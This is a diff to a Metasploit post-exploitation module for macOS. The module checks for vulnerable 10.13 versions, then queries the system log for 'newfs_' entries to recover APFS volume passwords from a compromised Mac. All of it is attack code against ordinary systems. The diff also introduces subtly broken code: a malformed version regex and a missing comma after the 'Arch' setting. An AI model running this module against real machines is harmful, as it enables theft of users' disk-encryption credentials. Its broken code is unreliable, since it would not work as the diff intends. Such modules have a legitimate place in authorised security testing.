@@ -19,7 +19,7 @@ class MetasploitModule < Msf::Post
 
         ],
       'Platform'      => 'osx',
-      'Arch'          => ARCH_X32, ARCH_X64
+      'Arch'          => ARCH_ALL
       'Author'         => [
         'Sarah Edwards',  # earliest public discovery
         'cbrnrd'          # Metasploit module
@@ -42,15 +42,14 @@ class MetasploitModule < Msf::Post
     # ProductName: macOS
     # ProductVersion: 10.12
     # BuildVersion: 7A100
-    osx_version = cmd_exec('sw_vers | grep "ProductVersion" | awk \'{ print $2 }\'')
-    # Would using Gem::Version checking be more reliable?
-    return CheckCode::Vulnerable if osx_version =~ /^10\.13\.[0-3]$/
-    CheckCode::Safe
+    osx_version = cmd_exec('sw_vers -productVersion')
+    return Exploit::CheckCode::Vulnerable if osx_version =~ /^10\.13[\.[0-3]]?$/
+    Exploit::CheckCode::Safe
   end
 
   def run
-    return if check == CheckCode::Safe
-    cmd = "log stream --info --predicate 'eventMessage contains \"newfs_\"'"
+    return if check == Exploit::CheckCode::Safe
+    cmd = "log show --info --predicate 'eventMessage contains \"newfs_\"'"
     cmd << " | grep #{datastore['MOUNT_PATH']}" unless datastore['MOUNT_PATH'].empty?
     vprint_status "Running \"#{cmd}\" on target..."
     results = cmd_exec(cmd)
